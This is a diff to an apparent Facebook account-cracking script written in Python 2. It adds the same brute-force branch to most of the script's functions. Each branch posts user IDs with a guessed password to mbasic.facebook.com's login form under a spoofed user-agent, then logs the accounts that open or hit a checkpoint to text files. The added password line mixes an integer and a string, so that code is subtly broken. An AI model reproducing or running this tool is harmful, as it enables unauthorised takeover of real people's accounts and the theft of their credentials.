@@ -1122,6 +1122,25 @@ def xokpauto():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6) 
                             
                     
         except:
@@ -1543,6 +1562,25 @@ def xokp():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
                             
                     
         except:
@@ -1971,6 +2009,25 @@ def xokp():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
                             
                     
         except:
@@ -2401,6 +2458,26 @@ def xoknp():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
+                                             
                             
                     
         except:
@@ -2663,6 +2740,25 @@ def n_p_pass():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
         except:
             pass
     
@@ -2885,6 +2981,25 @@ def p_p_pass():
                                             cp.write(uid+ " | " +pass4+ "\n")
                                             cp.close()
                                             cps.append(uid+pass4)
+                                    else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
         except:
             pass
     
@@ -4122,6 +4237,25 @@ def fileauto():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
                             
                     
         except:
@@ -4298,6 +4432,25 @@ def n_f_p_pass():
                                                     cp.write(uid+ " | " +pass5+ "\n")
                                                     cp.close()
                                                     cps.append(uid+pass5)
+                                            else:
+                                                    pass6= 110+"786"
+                                                    rana = requests.Session()
+                                                    rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+                                                    p = rana.get('https://mbasic.facebook.com')
+                                                    b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass6, 'login': 'submit'})
+                                                    if 'c_user' in rana.cookies.get_dict().keys():
+                                                        print "\x1b[1;92m[Noob-OK] "+uid + " | " + pass6
+                                                        ok=open('Noob-ok.txt', 'a')
+                                                        ok.write(uid+ " | " +pass6+ "\n")
+                                                        ok.close()
+                                                        oks.append(uid+pass6)
+                                                    else:
+                                                        if 'checkpoint' in rana.cookies.get_dict().keys():
+                                                            print "\x1b[1;91m[Noob-CP] "+uid + " | " + pass6
+                                                            cp=open('Noob-cp.txt', 'a')
+                                                            cp.write(uid+ " | " +pass6+ "\n")
+                                                            cp.close()
+                                                            cps.append(uid+pass6)
                             
                     
         except:
@@ -4449,7 +4602,7 @@ def f_p_pass():
                                                     cp.close()
                                                     cps.append(uid+pass5)
                                                 else:
-                                                    pass6= first+ "last"
+                                                    pass6= 110+"786"
                                                     rana = requests.Session()
                                                     rana.headers.update({'Host': 'mbasic.facebook.com', 'cache-control': 'max-age=0', 'upgrade-insecure-requests': '1', 'user-agent': lines, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'accept-encoding': 'gzip, deflate', 'upgrade-insecure-requests': str(random.randint(100, 200)), 'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
                                                     p = rana.get('https://mbasic.facebook.com')
